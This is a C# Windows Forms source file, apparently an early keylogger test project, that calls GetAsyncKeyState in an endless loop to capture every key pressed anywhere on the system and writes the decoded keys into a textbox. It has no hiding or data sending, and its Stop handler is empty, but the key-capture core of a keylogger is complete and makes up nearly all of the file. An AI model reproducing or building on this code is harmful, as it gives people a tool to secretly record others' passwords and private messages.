using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;

namespace KeyLoggerTest
{
    public partial class Form1 : Form
    {

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private bool upper;
        private bool shift;
        private bool bspace;

        private int caps = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void Start_Click(object sender, EventArgs e)
        {
            LogKeys();
        }

        private void Stop_Click(object sender, EventArgs e)
        {

        }

        private void LogKeys()
        {
            while (true)
            {
                for (int i = 1; i < 255; i++)
                {
                    int result = GetAsyncKeyState(i);
                    if (result != 0)
                    {
                        textBox1.AppendText(ProcessKey(i));
                        
                        //MessageBox.Show(bspace.ToString());
                        //textBox1.AppendText(i.ToString());
                        //ProcessException(ProcessKey(i));
                        System.Threading.Thread.Sleep(117);
                    }
                }
            }
        }

        private void ProcessException(string ex)
        {
            
        }

        private string ProcessKey(int key)
        {
            switch (key)
            {
                case 0:
                    return "Mouse Up";
                case 1:
                    return "[LCLICK]";
                case 2:
                    return "[RCLICK]";
                case 13:
                    return "\n";
                case 9:
                    return "    ";
                case 16:
                    return "";
                case 162:
                    return "[CTRL]";
                case 163:
                    return "[CTRL]";
                case 161://Shift
                    shift = true;
                    return "";
                case 160://Shift
                    shift = true;
                    return "";
                case 20://Caps Lock
                    if (caps == 0)
                    {
                        caps++;
                        upper = true;
                        return "";
                    }
                    else
                    {
                        caps = 0;
                        upper = false;
                        return "";
                    }
                case 17:
                    return "";
                case 164:
                    return "[ALT]";
                case 165:
                    return "[ALT]";
                case 18:
                    return "";
                case 93:
                    return "<Menu Key>";
                case 37:
                    return "<Left Arrow>";
                case 39:
                    return "<Right Arrow>";
                case 38:
                    return "<Up Arrow>";
                case 40:
                    return "<Down Arrow>";
                case 220:
                    return "\\";
                case 191:
                    return "/";
                case 222:
                    return "'";
                case 186:
                    return ";";
                case 8://Backspace
                    bspace = true;
                    return "";
                case 33:
                    return "<Page Up>";
                case 34:
                    return "<Page Down>";
                case 35:
                    return "<End>";
                case 36:
                    return "<Home>";
                case 144:
                    return "<Num Lk>";
                case 44:
                    return "<Prnt Scrn>";
                case 45:
                    return "<Insert>";
                case 112:
                    return "<F1>";
                case 113:
                    return "<F2>";
                case 114:
                    return "<F3>";
                case 115:
                    return "<F4>";
                case 116:
                    return "<F5>";
                case 117:
                    return "<F6>";
                case 118:
                    return "<F7>";
                case 119:
                    return "<F8>";
                case 120:
                    return "<F9>";
                case 121:
                    return "<F10>";
                case 122:
                    return "<F11>";
                case 123:
                    return "<F12>";
                case 219:
                    return "[";
                case 221:
                    return "]";
                case 189:
                    return "-";
                case 187:
                    return "=";
                case 91:
                    return "<Windows Key>";
                case 188:
                    return ",";
                case 190:
                    return ".";
                case 192:
                    return "`";
                case 96:
                    return "0";
                case 97:
                    return "1";
                case 98:
                    return "2";
                case 99:
                    return "3";
                case 100:
                    return "4";
                case 101:
                    return "5";
                case 102:
                    return "6";
                case 103:
                    return "7";
                case 104:
                    return "8";
                case 105:
                    return "9";
                case 106:
                    return "*";
                case 107:
                    return "+";
                case 109:
                    return "-";
                case 111:
                    return "/";
                case 110:
                    return ".";
                default:
                    //return ((char)key).ToString();   
                    return ProcessCaps(key);
            }
        }

        private string ProcessBack()
        {
            string temp = "";
            if (bspace)
            {
                temp = textBox1.Text;
                temp = temp.Remove(temp.Length - 1);
                bspace = false;
            }
            return temp;
        }

        private string ProcessCaps(int key)
        {
            string specCase = "";
            if (!upper) specCase = ((char)key).ToString().ToLower();
            if (upper) specCase = ((char)key).ToString();
            if (shift) specCase = ((char)key).ToString().ToUpper(); shift = false;
            /*if (bspace)
            {
                specCase = textBox1.Text;
                specCase = specCase.Remove(specCase.Length - 1);
                bspace = false;
            }*/

            return specCase;
        }
    }
}
